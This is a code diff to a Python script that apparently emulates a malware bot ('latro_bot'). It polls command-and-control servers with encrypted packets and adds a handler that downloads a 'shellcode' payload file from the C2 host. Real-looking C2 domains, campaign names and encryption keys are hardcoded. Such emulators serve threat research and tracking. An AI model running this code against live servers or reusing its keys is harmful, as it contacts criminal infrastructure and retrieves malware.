@@ -36,6 +36,7 @@ class latro_bot:
             '2':True,
             '3':True,
             '4':True,
+            '21':self.command_21_handle,
             '20':self.command_20_handle
         }
         self.previous_command = None
@@ -96,12 +97,14 @@ class latro_bot:
         self.counter += 1
 
 
-    def registration_post_request(self, packet_data):
+    def registration_post_request(self, packet_data, url = None):
+        if not url: 
+            url = self.url
         data = packet_data
         print(data)
         data = self.crypt_packet_data(data)
         print(data)
-        r = requests.post(self.url, headers = self.headers, data = data, verify=False)
+        r = requests.post(url, headers = self.headers, data = data, verify=False)
         print(r.text)
         return r.text
 
@@ -164,16 +167,46 @@ class latro_bot:
     def command_20_handle(self):
         self.counter = 0
     
+    def command_21_handle(self): 
+        print('MADE IT TO COMMAND 21')
+        #shellcode dwnld
+        print(type(self.response_command))
+        if self.response_command:
+            command_list = self.response_command.split('|')
+            command_num = command_list[-2]
+            print(f"COMMAND_NUM: {command_num}")
+            if command_num == '21': 
+                bin_file = command_list[-1].replace('front://', '')
+                url = self.url.replace('live/', 'files/')
+                url = url + bin_file
+                print("PAYLOAD URL")
+                print(url)
+                try: 
+                    response = requests.get( url = url, headers = self.headers, verify = False)
+                    with open('latro_cmd_21.bin' , 'w') as outfile: 
+                        outfile.write(response.text)
+                except Exception as e: 
+                    print(e)
+            
+
+
+        
+    
     def comms_command_handler(self, decrypted_data= None): 
+        if 'COMMAND' in decrypted_data:
             command_list = decrypted_data.split('|')
-            command_num = command_list[1]
+            command_num = command_list[-2]
+            print(command_num)
+            print(type(command_num))
             if command_num in self.command_dict: 
                 if self.command_dict[command_num] == True: 
-                    self.previous_command == command_num
+                    self.previous_command = command_num
                 else:
                     self.command_dict[command_num]()
             else: 
                 pass
+        else:
+            pass
     
     def comms_main(self): 
         while True: 
@@ -183,18 +216,24 @@ class latro_bot:
                 self.previous_command = None
             else: 
                 packet_data = self.packet_format_string()
+            self.packet_data = packet_data
             response_data = self.registration_post_request(packet_data)
             self.next_packet()
             decrypted_data = self.decrypt_packet(response_data)
+            self.response_command = decrypted_data
             print(decrypted_data)
-            self.comms_command_handler(decrypted_data)
-            sleep(37)
+            try:
+                self.comms_command_handler(decrypted_data)
+            except:
+                print(decrypted_data)
+
+            sleep(29)
 
 
 
 
 
 #test_bot = latro_bot(key= 'qNfSHTVKEU7mknHSFrQCwp0mmQfXUNPIcA66gezNz49qQOVX0P', campaign_id='Jupiter', url='https://riscoarchez.com/live/')
-test_bot = latro_bot(counter = 0, key= 'EhAyPSHvva9CvL6OIddDJvDXHJjoMsqXyjraKyYmXFqDGdAYyO', campaign_id='Venus', url='https://stripplasst.com/live/')
+test_bot = latro_bot(counter = 17, key= 'EhAyPSHvva9CvL6OIddDJvDXHJjoMsqXyjraKyYmXFqDGdAYyO', campaign_id='Venus', url='https://stripplasst.com/live/')
 print(test_bot.counter)
 test_bot.comms_main()
